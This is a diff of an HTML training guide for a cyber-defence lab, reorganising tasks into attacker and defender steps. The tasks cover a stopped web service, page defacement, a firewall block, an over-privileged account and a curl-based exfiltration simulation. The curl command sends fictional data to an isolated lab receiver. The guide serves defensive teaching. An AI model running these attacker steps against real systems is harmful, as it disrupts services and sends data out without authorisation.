@@ -539,16 +539,24 @@ ip route</pre>
 
 <h2 id="module-1">Module 1 — Attacker already has system access</h2>
 <h3 id="service-tampering">Task 1.1 — Service tampering and recovery</h3>
+<p><strong>Roles and command windows:</strong> each team runs only its assigned steps in its own terminal or PowerShell window. Attacker commands do not inherit defender variables. Run each role’s setup commands in that role’s window; keep it open for that role’s later steps. Defender baselines and recovery files remain with the defender. Scenario preparation changes the lab state, but does not require the attacker to run defender commands. For Module 2, attacker actions run outside the target VM; Task 2.2 login attempts are instructor-operated.</p>
 <p>Practice responding to a service outage caused by an attacker who already has administrative access. The attacker
-  stops the web service, and the defender investigates, restores it, and verifies recovery. Follow the five steps below:</p>
-<ol>
-  <li>Confirm normal service before the attack.</li>
-  <li>Introduce the service outage.</li>
-  <li>Examine the outage and collect evidence.</li>
-  <li>Restore the service and confirm it works.</li>
-  <li>Review the results and explain the response.</li>
-</ol>
-<h4 id="section-step-1-verify-the-linux-baseline">Step 1 — Verify the Linux baseline</h4>
+  stops the web service, and the defender investigates, restores it, and verifies recovery. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5 id="section-step-2-linux-attacker-action">Step 1 — Action</h5>
+
+<p>Record the time, stop Nginx once, then hand over. Do not change anything else.</p>
+<p>Record the time for comparison with the evidence:</p>
+<pre>date -u</pre>
+<p>Stop only Nginx for the assigned attacker action:</p>
+<pre>sudo systemctl stop nginx</pre>
+
+<section id="service-web-linux-outage">
+  <h4>Defender</h4>
+<h5 id="section-step-1-verify-the-linux-baseline">Step 1 — Verify the Linux baseline</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+
 <p> Verify the relevant services and record the results. </p>
 <p>Record the time and confirm that the hostname is <code>ccdc-linux</code>:</p>
 <pre>date -u
@@ -559,7 +567,8 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
 <p class="command-help-links"><strong>Official command documentation:</strong>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/date.1.html">date</a></p>
 <section id="service-web-linux-baseline">
-  <h4>Laptop browser check — baseline</h4>
+  <h5>Step 2 — Laptop browser check — baseline</h5>
+
   <p><strong>Location: your own computer, outside the VM.</strong> Before the attacker stops the service, confirm the
     website works from your own campus laptop. Open <a
       href="http://128.198.74.133:18080/index.html">http://128.198.74.133:18080/index.html</a>. Hard-refresh to avoid a
@@ -575,15 +584,8 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
     HTTP service is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do
     not stop networking, RDP or TCP itself.</p>
 </section>
-<h4 id="section-step-2-linux-attacker-action">Step 2 — Linux attacker action</h4>
-<p>Record the time, stop Nginx once, then hand over. Do not change anything else.</p>
-<p>Record the time for comparison with the evidence:</p>
-<pre>date -u</pre>
-<p>Stop only Nginx for the assigned attacker action:</p>
-<pre>sudo systemctl stop nginx</pre>
+<h5>Step 3 — Laptop browser check — outage</h5>
 
-<section id="service-web-linux-outage">
-  <h4>Laptop browser check — outage</h4>
   <p><strong>Location: your own computer, outside the VM.</strong> With the HTTP service stopped, test again from your
     own campus laptop before the defender restores it. Open <a
       href="http://128.198.74.133:18080/index.html">http://128.198.74.133:18080/index.html</a>. Hard-refresh to avoid a
@@ -600,7 +602,8 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
     is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do not stop
     networking, RDP or TCP itself.</p>
 </section>
-<h4 id="section-step-3-linux-defender-investigation">Step 3 — Linux defender investigation</h4>
+<h5 id="section-step-3-linux-defender-investigation">Step 4 — Investigation</h5>
+
 <p>Confirm the outage before changing the system. A failed curl and an inactive service are expected in this round.
   Record output or screenshots; the journal provides evidence of a service change, not necessarily the actor&#x27;s
   identity.</p>
@@ -616,7 +619,8 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
 <pre>sudo ss -lntup</pre>
 <p class="command-help-links"><strong>Official command documentation:</strong>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/journalctl.1.html">journalctl</a></p>
-<h4 id="section-step-4-linux-defender-recovery-and-validation">Step 4 — Linux defender recovery and validation</h4>
+<h5 id="section-step-4-linux-defender-recovery-and-validation">Step 5 — Recovery and validation</h5>
+
 <p> Verify the relevant services and record the results. </p>
 <p>Start Nginx to restore the web service:</p>
 <pre>sudo systemctl start nginx</pre>
@@ -629,7 +633,7 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
 <pre>date -u</pre>
 
 <section id="service-web-linux-recovery">
-  <h5>Laptop browser check — recovery</h5>
+  <h6>Laptop browser check — recovery</h6>
   <p><strong>Location: your own computer, outside the VM.</strong> After restoring the HTTP service, repeat the same
     request from your own campus laptop. Open <a
       href="http://128.198.74.133:18080/index.html">http://128.198.74.133:18080/index.html</a>. Hard-refresh to avoid a
@@ -645,17 +649,32 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
     HTTP service is down: a successful port test alone does not prove HTTP works. This is an HTTP service exercise; do
     not stop networking, RDP or TCP itself.</p>
 </section>
-<h4 id="section-step-5-linux-defense-review-and-deliverables">Step 5 — Linux defense review and deliverables</h4>
+<h5 id="section-step-5-linux-defense-review-and-deliverables">Step 6 — Linux defense review and deliverables</h5>
+
 <p> Verify the relevant services and record the results. </p>
 <h3 id="web-integrity">Task 1.2 — Web-content tampering and evidence</h3>
-<p>Investigate unauthorized changes to a webpage even when the web service still responds. Follow the steps below:</p>
-<ol>
-  <li>Prepare a trusted recovery copy</li>
-  <li>Attacker changes the page</li>
-  <li>Defender investigates before restoring</li>
-  <li>Defender recovers and verifies</li>
-</ol>
-<h4>Step 1 — Prepare a trusted recovery copy</h4>
+<p>Investigate unauthorized changes to a webpage even when the web service still responds. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Changes the page</h5>
+
+<p>Open your own Terminal inside the Ubuntu VM. The commands below use the webpage’s full path and require no variables or recovery files from Defender step 1.</p>
+<p>In the Ubuntu VM, record the time and replace only the exercise webpage with the marker below. Keep Nginx, SSH and
+  remote desktop running. Do not modify your recovery copy or baseline checksum. Hand over to the defender after the change.</p>
+<p>Record the time for comparison with the evidence:</p>
+<pre>date -u</pre>
+<p>Replace only the exercise webpage with the assigned changed-page marker:</p>
+<pre>printf '%s\n' '&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;title&gt;CCDC exercise&lt;/title&gt;&lt;p&gt;CCDC exercise: changed page&lt;/p&gt;&lt;/html&gt;' | sudo tee /var/www/html/index.html</pre>
+<p>Check the service states and request the webpage; compare both with the expected results for this step:</p>
+<pre>systemctl is-active nginx ssh
+curl --max-time 5 -i http://172.29.242.30/index.html</pre>
+<p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://manpages.ubuntu.com/manpages/noble/man1/tee.1.html">tee</a></p>
+<p>Expect HTTP 200 with the changed page. This is a content-integrity incident even though the service remains active.</p>
+<h4>Defender</h4>
+<h5>Step 1 — Prepare a trusted recovery copy</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+
 <p>In Terminal inside your assigned Ubuntu VM, confirm the starting service state and webpage:</p>
 <p>Check the service states and request the webpage; compare both with the expected results for this step:</p>
 <pre>systemctl is-active nginx ssh
@@ -663,10 +682,10 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
 <p>Both services should be active and the page should show <code>CCDC Linux storefront: operational</code>.
   Confirm the same content from your campus laptop at <a href="http://128.198.74.133:18080/index.html">the Linux
   website</a>. Continue only when the baseline is correct. If a previous round left the page changed, restore that
-  round’s saved original using Step 4 before starting a new round; do not save the changed page as a trusted copy.</p>
+  round’s saved original using Defender step 3 before starting a new round; do not save the changed page as a trusted copy.</p>
 <p>Before the attack, run the following commands one at a time to create a new exercise directory and save the original
-  page and baseline checksum yourselves. Check each result before continuing. Use the same Terminal window throughout one round. When you switch roles,
-  repeat Step 1 to create a new directory for the next round. The previous round’s files remain saved.</p>
+  page and baseline checksum yourselves. Check each result before continuing. The defender keeps this Terminal open for the defender investigation and recovery steps. The attacker uses a separate Terminal for Attacker step 1. When you switch roles,
+  repeat Defender step 1 to create a new directory for the next round. The previous round’s files remain saved.</p>
 <p>Create a new directory for this round’s recovery files or evidence:</p>
 <pre>case_dir=$(mktemp -d "$HOME/CCDC-Exercise-1-2.XXXXXX")</pre>
 <p>Check the service states and request the webpage; compare both with the expected results for this step:</p>
@@ -689,20 +708,9 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
   path before continuing.</p>
 <p><strong>Note:</strong> in a real environment, store the trusted recovery copy and baseline checksum outside the
   victim computer so an attacker who compromises that computer cannot alter them.</p>
-<h4>Step 2 — Attacker changes the page</h4>
-<p>In the Ubuntu VM, record the time and replace only the exercise webpage with the marker below. Keep Nginx, SSH and
-  remote desktop running. Do not modify your recovery copy or baseline checksum. Hand over to the defender after the change.</p>
-<p>Record the time for comparison with the evidence:</p>
-<pre>date -u</pre>
-<p>Replace only the exercise webpage with the assigned changed-page marker:</p>
-<pre>printf '%s\n' '&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;title&gt;CCDC exercise&lt;/title&gt;&lt;p&gt;CCDC exercise: changed page&lt;/p&gt;&lt;/html&gt;' | sudo tee /var/www/html/index.html</pre>
-<p>Check the service states and request the webpage; compare both with the expected results for this step:</p>
-<pre>systemctl is-active nginx ssh
-curl --max-time 5 -i http://172.29.242.30/index.html</pre>
-<p class="command-help-links"><strong>Official command documentation:</strong>
-  <a href="https://manpages.ubuntu.com/manpages/noble/man1/tee.1.html">tee</a></p>
-<p>Expect HTTP 200 with the changed page. This is a content-integrity incident even though the service remains active.</p>
-<h4>Step 3 — Defender investigates before restoring</h4>
+<h5>Step 2 — Investigates before restoring</h5>
+
+<p>Return to your defender Terminal from Defender step 1. If it was closed, set <code>case_dir</code> to the recorded recovery-directory path before continuing. Do not save the changed page as a new baseline.</p>
 <p>From your campus laptop, open <a href="http://128.198.74.133:18080/index.html">the Linux website</a> with a fresh
   request and confirm that the operational content has changed. Then run the following inside the Ubuntu VM to preserve
   evidence in a separate folder within this round’s exercise directory:</p>
@@ -725,12 +733,13 @@ sudo sha256sum /var/www/html/index.html | tee "$evidence_dir/hash.txt"</pre>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/stat.1.html">stat</a> ·
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/cat.1.html">cat</a> ·
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/tail.1.html">tail</a></p>
-<p>Compare the changed file’s hash with the checksum you saved in Step 1 using the read-only command below. A mismatch is expected
+<p>Compare the changed file’s hash with the checksum you saved in Defender step 1 using the read-only command below. A mismatch is expected
   after the attack; it confirms that the webpage differs from the baseline. Preserve the changed page before recovery.
   File timestamps and service logs alone do not establish who edited the page.</p>
 <pre>sudo sha256sum -c "$case_dir/original.sha256"</pre>
-<h4>Step 4 — Defender recovers and verifies</h4>
-<p>After preserving the evidence, restore your trusted recovery copy from Step 1 using the individual commands below in the Ubuntu VM.
+<h5>Step 3 — Recovers and verifies</h5>
+
+<p>After preserving the evidence, restore your trusted recovery copy from Defender step 1 using the individual commands below in the Ubuntu VM.
   Do not use the changed page as the recovery baseline. </p>
 <p>Restore the original page saved before the attack:</p>
 <pre>sudo cp -a "$case_dir/original.html" /var/www/html/index.html</pre>
@@ -743,19 +752,14 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
   laptop HTTP check with a fresh request and verify that it also shows <code>CCDC Linux storefront: operational</code>.</p>
 <p><strong>Practice check:</strong> show the changed page and preserved evidence, demonstrate that the restored hash
   matches the baseline, and confirm normal HTTP and SSH service. Explain why HTTP 200 alone did not prove the page was
-  correct. Keep this round’s evidence and recovery copy, then reverse attacker and defender roles and repeat from Step 1
+  correct. Keep this round’s evidence and recovery copy, then reverse attacker and defender roles and repeat from Defender step 1
   with a new exercise directory. No written report submission is required.</p>
 <h3 id="firewall-tampering">Task 1.3 — Firewall rule configuration and recovery</h3>
-<p>Investigate an HTTP outage caused by a firewall change while the web service remains running. Follow the steps below:</p>
-<ol><li>Configure and test a scoped HTTP allow rule.</li>
-  <li>Attacker blocks incoming HTTP traffic.</li>
-  <li>Defender investigates the outage while Nginx remains running.</li>
-  <li>Defender removes the exercise rule and verifies recovery.</li>
-</ol>
-<h4>Before the attack — Configure and test an allow rule</h4><p>Practice reading and configuring a rule before the attack round. Confirm the firewall is active, normal laptop HTTP works, and the instructor has a guest recovery console. Save the initial rule listing. Keep existing rules, default policies and SSH/RDP access unchanged.</p><table><tr><th>Rule field</th><th>Value and purpose</th></tr><tr><td>Direction and action</td><td>Inbound allow: permit requests arriving at the VM.</td></tr><tr><td>Protocol and port</td><td>TCP 80 on the guest, not the laptop-facing relay port.</td></tr><tr><td>Source address</td><td>172.29.242.1, the relay address normally seen in guest logs. Confirm it using an actual laptop request.</td></tr><tr><td>Destination address</td><td>The assigned VM’s internal address.</td></tr></table><p>A scoped allow rule does not remove broader existing permissions. This exercise teaches rule construction and troubleshooting; it does not establish that all other sources are blocked.</p><p>In the Ubuntu terminal, inspect the policy and numbered rules:</p><pre>sudo ufw status verbose
-sudo ufw status numbered</pre><p>If an equivalent allow rule already exists, inspect it and skip creating or deleting it. Otherwise preview and add this temporary rule:</p><pre>sudo ufw --dry-run allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
-sudo ufw allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
-sudo ufw status numbered</pre><p><code>--dry-run</code> previews the change; <code>from</code> selects the source and <code>to … port 80</code> selects the destination service. Confirm a fresh laptop request to <a href="http://128.198.74.133:18080/index.html">the Linux website</a> returns operational content. Existing rules may also allow this traffic. Continue with the attack below; its deny rule is inserted before ordinary UFW user allow rules.</p><h4>Step 1 — Attacker: block incoming HTTP traffic</h4>
+<p>Investigate an HTTP outage caused by a firewall change while the web service remains running. Use the role-specific steps below.</p>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Block incoming HTTP traffic</h5>
+
 <p>Run the guest commands in Terminal inside your assigned Ubuntu VM. First inspect the existing firewall rules and
   services:</p>
 <p>Inspect the current numbered firewall rules and whether UFW is active:</p>
@@ -766,7 +770,7 @@ curl --max-time 5 -fsS http://127.0.0.1/index.html</pre>
 <p>UFW must report <code>Status: active</code>, all three services must be active and the local page must show the
   operational storefront. From your campus laptop, open <a href="http://128.198.74.133:18080/index.html">the Linux
   website</a> with a fresh request and confirm the same page. Do not continue until these baseline checks pass.
-  If a rule marked <code>CCDC-Exercise-1-3</code> is already present, complete Step 3 before starting a new round.</p>
+  If a rule marked <code>CCDC-Exercise-1-3</code> is already present, complete Defender step 3 before starting a new round.</p>
 <p>Record the time, then add the following HTTP-only rule once:</p>
 <p>Record the time for comparison with the evidence:</p>
 <pre>date -u</pre>
@@ -780,7 +784,14 @@ curl --max-time 5 -fsS http://127.0.0.1/index.html</pre>
 <p>From your campus laptop, make a fresh request to the same website. Expect a timeout, request failure or relay error
   instead of the operational page. A successful TCP connection to the relay alone does not establish HTTP availability.
   Hand over to the defender after demonstrating the failure.</p>
-<h4>Step 2 — Defender: investigate the outage</h4>
+<h4>Defender</h4>
+<h5>Step 1 — Configure and test an allow rule</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+<p>Practice reading and configuring a rule before the attack round. Confirm the firewall is active, normal laptop HTTP works, and the instructor has a guest recovery console. Save the initial rule listing. Keep existing rules, default policies and SSH/RDP access unchanged.</p><table><tr><th>Rule field</th><th>Value and purpose</th></tr><tr><td>Direction and action</td><td>Inbound allow: permit requests arriving at the VM.</td></tr><tr><td>Protocol and port</td><td>TCP 80 on the guest, not the laptop-facing relay port.</td></tr><tr><td>Source address</td><td>172.29.242.1, the relay address normally seen in guest logs. Confirm it using an actual laptop request.</td></tr><tr><td>Destination address</td><td>The assigned VM’s internal address.</td></tr></table><p>A scoped allow rule does not remove broader existing permissions. This exercise teaches rule construction and troubleshooting; it does not establish that all other sources are blocked.</p><p>In the Ubuntu terminal, inspect the policy and numbered rules:</p><pre>sudo ufw status verbose
+sudo ufw status numbered</pre><p>If an equivalent allow rule already exists, inspect it and skip creating or deleting it. Otherwise preview and add this temporary rule:</p><pre>sudo ufw --dry-run allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
+sudo ufw allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
+sudo ufw status numbered</pre><p><code>--dry-run</code> previews the change; <code>from</code> selects the source and <code>to … port 80</code> selects the destination service. Confirm a fresh laptop request to <a href="http://128.198.74.133:18080/index.html">the Linux website</a> returns operational content. Existing rules may also allow this traffic. Continue with the attack below; its deny rule is inserted before ordinary UFW user allow rules.</p><h5>Step 2 — Investigate the outage</h5>
+
 <p>Before changing anything, run the following inside the Ubuntu VM:</p>
 <p>Record the time for comparison with the evidence:</p>
 <pre>date -u</pre>
@@ -795,7 +806,8 @@ sudo ufw status numbered</pre>
   rule and record its source subnet, destination port and position. Compare this with the failed laptop request.</p>
 <p>Explain why the evidence points to network filtering rather than a stopped web service. A successful loopback
   request tests the local service; it does not prove that requests from outside the VM are allowed.</p>
-<h4>Step 3 — Defender: recover and verify</h4>
+<h5>Step 3 — Recover and verify</h5>
+
 <p>After preserving the evidence, remove only the exact exercise rule using the command below. Leave UFW enabled and
   preserve the existing allow rules:</p>
 <p>Remove only the exact HTTP exercise rule:</p>
@@ -810,22 +822,21 @@ curl --max-time 5 -fsS http://127.0.0.1/index.html</pre>
 <p>Confirm that UFW remains active, the exercise deny rule is absent and the original allow rules remain. Repeat the
   laptop HTTP request with a fresh request; it must now return the operational storefront. All three services should
   still be active and your remote desktop session should remain connected.</p>
-<h4>Cleanup — Restore the original policy</h4><p>Only if you created the allow rule during this round, remove it now. Skip this command if the equivalent rule existed before the exercise:</p><pre>sudo ufw delete allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
+<h5>Step 4 — Restore the original policy</h5>
+<p>Only if you created the allow rule during this round, remove it now. Skip this command if the equivalent rule existed before the exercise:</p><pre>sudo ufw delete allow in proto tcp from 172.29.242.1 to 172.29.242.30 port 80 comment &#x27;CCDC-Exercise-1-3-Allow&#x27;
 sudo ufw status numbered</pre><p>Compare the final rules with the saved baseline. Recheck external HTTP and legitimate remote access. Explain the direction, source, destination, port and precedence of the rules before reversing roles. Test with fresh requests because an existing connection may not reflect a new rule.</p><p>Reference: <a href="https://manpages.ubuntu.com/manpages/noble/man8/ufw.8.html">UFW rule syntax</a>.</p><p><strong>Practice check:</strong> show the external HTTP failure, the running local service, the exercise rule and
   successful external recovery after removing that rule. Explain how this differs from Task 1.1. Keep your evidence,
-  then reverse attacker and defender roles and repeat from Step 1. No written report submission is required.</p>
+  then reverse attacker and defender roles and repeat from Attacker step 1. No written report submission is required.</p>
 <h3 id="account-compromise">Task 1.4 — Compromised account and excessive privilege</h3>
 <p>Investigate an exercise account with excessive privileges and contain its access while preserving legitimate services.
   Complete the four steps below yourselves, then switch roles and repeat.</p>
-<ol>
-  <li>Prepare the dedicated exercise account and check normal service.</li>
-  <li>Attacker demonstrates the account’s excessive access.</li>
-  <li>Defender preserves evidence and removes the excessive access.</li>
-  <li>Defender verifies containment, checks normal service and cleans up.</li>
-</ol>
 <p>Use only the dedicated <code>ccdc-demo</code> account for this exercise. Keep your assigned trainee account’s privileges
   unchanged. This task starts with access to an account; it does not involve guessing or cracking passwords.</p>
-<h4>Step 1 — Prepare the dedicated exercise account</h4>
+<p><strong>Round order:</strong> Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Prepare the dedicated exercise account</h5>
+
+<p>The attacker performs this setup and Attacker step 2 in their own VM session, using the temporary password they set here. The defender starts at Defender step 1 in a separate command window and discovers the account independently.</p>
 <p>In Terminal inside the Ubuntu VM, use your assigned trainee account with sudo. Run each command separately and check
   its result before continuing.</p>
   <p>Check the service states and request the webpage; compare both with the expected results for this step:</p>
@@ -870,7 +881,8 @@ curl --max-time 5 -fsS http://172.29.242.30/index.html</pre>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/passwd.1.html">passwd</a> ·
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/nano.1.html">nano</a> ·
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/id.1.html">id</a></p>
-<h4>Step 2 — Attacker: demonstrate the excessive privilege</h4>
+<h5>Step 2 — Demonstrate the excessive privilege</h5>
+
 <p>Open a second Terminal inside the same Ubuntu desktop. Switch only this shell to the exercise account, entering its
   temporary password:</p>
 <pre>su - ccdc-demo</pre>
@@ -888,8 +900,10 @@ sudo -l</pre>
 <p>The stop command should succeed without a sudo password prompt. From your campus laptop, request the website again;
   it should no longer return the operational page. Leave this exercise shell open for the containment test. Do not stop
   SSH or remote desktop, and do not change any other service, account or rule.</p>
-<h4>Step 3 — Defender: investigate and contain</h4>
-<p>Return to the original Terminal running as your assigned trainee account. Keep this Terminal open through Step 4.
+<h4>Defender</h4>
+<h5>Step 1 — Investigate and contain</h5>
+
+<p>Open your own defender Terminal running as your assigned trainee account. Keep this Terminal open through Defender step 2.
   Record the account, the sudo grant, service state and relevant events:</p>
 <p>Create a new directory for this round’s recovery files or evidence:</p>
 <pre>case_dir=$(mktemp -d "$HOME/CCDC-Exercise-1-4.XXXXXX")</pre>
@@ -917,7 +931,8 @@ sudo journalctl _COMM=sudo --since '20 minutes ago' --utc --no-pager &gt; "$case
 <pre>sudo systemctl start nginx</pre>
 <p class="command-help-links"><strong>Official command documentation:</strong>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/rm.1.html">rm</a></p>
-<h4>Step 4 — Defender: verify containment and clean up</h4>
+<h5>Step 2 — Verify containment and clean up</h5>
+
 <p>In the attacker’s existing <code>ccdc-demo</code> shell, repeat exactly the same command:</p>
 <pre>sudo -n /usr/bin/systemctl stop nginx</pre>
 <p>Expect denial, such as a password-required or not-allowed message. Do not enter another account’s password or rerun
@@ -942,36 +957,24 @@ echo $?</pre>
 <p class="command-help-links"><strong>Official command documentation:</strong>
   <a href="https://manpages.ubuntu.com/manpages/noble/man8/userdel.8.html">userdel</a></p>
 <p>Expect no account output from <code>getent</code>, result code <code>0</code> for the absent exercise sudo rule, and
-  active services. Keep the evidence, reverse roles and repeat from Step 1 with a fresh exercise account.</p>
+  active services. Keep the evidence, reverse roles and repeat from Attacker step 1 with a fresh exercise account.</p>
 <p><strong>Practice check:</strong> show the successful attacker action, saved account and privilege evidence, the denied
   repeat attempt and normal service after recovery. Explain why removing this permission differs from merely restarting
   Nginx. No written report submission is required.</p>
 <h3 id="data-exfiltration">Task 1.5 — Suspicious outbound traffic and data exfiltration</h3>
 <p>Identify a process sending dummy business data out of the victim VM, contain the connection and verify normal service.
-  Follow the five steps below:</p>
-<ol>
-  <li>Prepare the dummy data and check the isolated receiver.</li>
-  <li>Attacker starts the visible transfer simulator.</li>
-  <li>Defender identifies the connection, process and received data.</li>
-  <li>Defender stops the sender and blocks further transfers to this receiver.</li>
-  <li>Defender verifies containment and normal service, then cleans up.</li>
-</ol>
+  Use the role-specific steps below.</p>
 <p>This exercise uses <code>curl</code> as a visible simulator and sends only the supplied fictional records. The receiver
   at <code>172.29.242.1:18081</code> is on the isolated lab host, outside the victim VM. It accepts only the exact dummy
   payload. No startup mechanism is installed. Use only this destination and the supplied file.</p>
-<h4>Step 1 — Prepare the dummy data and check the receiver</h4>
+<p><strong>Round order:</strong> the defender completes Defender step 1 before the attack. Then follow the handoffs below. Each role uses its own command window and numbered steps.</p>
+<h4>Attacker</h4>
+<h5>Step 1 — Prepare the dummy file and start the transfer</h5>
+
+<p>Open your own Terminal inside the assigned VM. Complete the file setup below in this window; no variables from the defender’s Defender step 1 are needed.</p>
 <p>Use your assigned trainee account in Terminal inside the Ubuntu VM. Download
   <a href="lab-assets/dummy-business-data.txt" download>the dummy business-data file</a> unchanged into Downloads inside
   the VM. If using an offline copy of this pack, copy the same file from <code>lab-assets</code> into Downloads.</p>
-<p>Check the services and confirm UFW is active:</p>
-<pre>systemctl is-active nginx ssh xrdp
-sudo ufw status verbose</pre>
-<p>Check the operational webpage and the isolated receiver:</p>
-<pre>curl --max-time 5 -fsS http://172.29.242.30/index.html
-curl --max-time 5 -fsS http://172.29.242.1:18081/health</pre>
-<p>Expect active services, an active firewall, the operational storefront and receiver mode
-  <code>dummy-data-only</code>. Confirm the storefront also loads from your campus laptop. Complete earlier tasks’
-  cleanup before starting this task; continue only after these checks pass.</p>
 <p>Create a fresh exercise directory and display its path:</p>
 <pre>case_dir=$(mktemp -d "$HOME/CCDC-Exercise-1-5.XXXXXX")
 printf 'Exercise directory: %s\n' "$case_dir"</pre>
@@ -982,7 +985,7 @@ printf 'Exercise directory: %s\n' "$case_dir"</pre>
 sha256sum "$case_dir/dummy-business-data.txt"</pre>
 <p>Expect the heading <code>CCDC TRAINING DATA ONLY</code> and two fictional customer records. Keep this Terminal open
   for the attacker’s command so <code>case_dir</code> remains available.</p>
-<h4>Step 2 — Attacker: start the transfer simulator</h4>
+
 <p>Record the UTC time:</p>
 <pre>date -u</pre>
 <p>Run one transfer of the supplied dummy file to the lab receiver:</p>
@@ -991,7 +994,22 @@ sha256sum "$case_dir/dummy-business-data.txt"</pre>
   connection and sender process remain visible. Leave this command running and hand over to the defender. If it finishes
   before investigation, repeat this single transfer once to observe a live connection. An HTTP 400 response means the
   file differs from the supplied dummy data; do not substitute any real file.</p>
-<h4>Step 3 — Defender: identify the connection and process</h4>
+<h4>Defender</h4>
+<h5>Step 1 — Check services and the receiver</h5>
+<p><strong>Before the attack:</strong> complete this preparation, then tell the other team the lab is ready. Resume the remaining defender steps after the assigned action.</p>
+
+
+<p>Check the services and confirm UFW is active:</p>
+<pre>systemctl is-active nginx ssh xrdp
+sudo ufw status verbose</pre>
+<p>Check the operational webpage and the isolated receiver:</p>
+<pre>curl --max-time 5 -fsS http://172.29.242.30/index.html
+curl --max-time 5 -fsS http://172.29.242.1:18081/health</pre>
+<p>Expect active services, an active firewall, the operational storefront and receiver mode
+  <code>dummy-data-only</code>. Confirm the storefront also loads from your campus laptop. Complete earlier tasks’
+  cleanup before starting this task; continue only after these checks pass.</p>
+<h5>Step 2 — Identify the connection and process</h5>
+
 <p>Open a second Terminal in the same Ubuntu desktop, using your assigned trainee account. Keep the attacker’s Terminal
   open. Record evidence before stopping its process.</p>
 <p>Create a separate evidence directory:</p>
@@ -1002,14 +1020,17 @@ sha256sum "$case_dir/dummy-business-data.txt"</pre>
   <code>pid=</code> value. It should identify the running curl process.</p>
 <p>Replace 1234 with that observed curl PID, then inspect its owner and complete command line:</p>
 <pre>ps -p 1234 -o pid,user,comm=NAME,args=ARGS | tee "$evidence_dir/process.txt"</pre>
+<p>Defender: download your own unchanged copy of <a href="lab-assets/dummy-business-data.txt" download>the supplied dummy file</a> into Downloads in your VM session. Compute its reference checksum without using the attacker’s directory or variables:</p>
+<pre>sha256sum "$HOME/Downloads/dummy-business-data.txt"</pre>
 <p>Read and save the independent receiver’s recent Linux receipts:</p>
 <pre>curl --max-time 5 -fsS http://172.29.242.1:18081/receipts/linux | tee "$evidence_dir/receipts-before.txt"</pre>
 <p>Find the receipt matching this round’s time and source IP <code>172.29.242.30</code>. Compare its SHA-256 value
-  with the checksum recorded in Step 1, and inspect the fictional payload. A receipt establishes that the dummy data
+  with the checksum of your own unchanged copy of <a href="lab-assets/dummy-business-data.txt" download>the supplied dummy file</a>, and inspect the fictional payload. A receipt establishes that the dummy data
   reached the receiver even if the sender is still waiting for its acknowledgement.</p>
 <p class="command-help-links"><strong>Official command documentation:</strong>
   <a href="https://manpages.ubuntu.com/manpages/noble/man1/ps.1.html">ps</a></p>
-<h4>Step 4 — Defender: stop and contain the transfer</h4>
+<h5>Step 3 — Stop and contain the transfer</h5>
+
 <p>Confirm the PID belongs to this exercise’s curl command, then stop only that process from the defender Terminal.
   Replace 1234 with the PID you inspected; do not terminate a service or unrelated process.</p>
 <p>Stop the identified sender:</p>
@@ -1027,7 +1048,8 @@ sha256sum "$case_dir/dummy-business-data.txt"</pre>
 <pre>curl --connect-timeout 3 --max-time 5 --data-binary "@$case_dir/dummy-business-data.txt" http://172.29.242.1:18081/upload/linux</pre>
 <p>Expect a connection failure or timeout. This demonstrates prevention of another transfer to this receiver;
   stopping a process or blocking traffic cannot undo data that was already received. Record the time and result.</p>
-<h4>Step 5 — Defender: verify service and clean up</h4>
+<h5>Step 4 — Verify service and clean up</h5>
+
 <p>Confirm the sender connection is gone and the services remain active:</p>
 <pre>sudo ss -ntp 'dport = :18081'
 systemctl is-active nginx ssh xrdp</pre>
@@ -1046,21 +1068,23 @@ curl --max-time 5 -fsS http://172.29.242.1:18081/receipts/linux</pre>
 <p>Remove the copied exercise file after the debrief:</p>
 <pre>rm "$case_dir/dummy-business-data.txt"</pre>
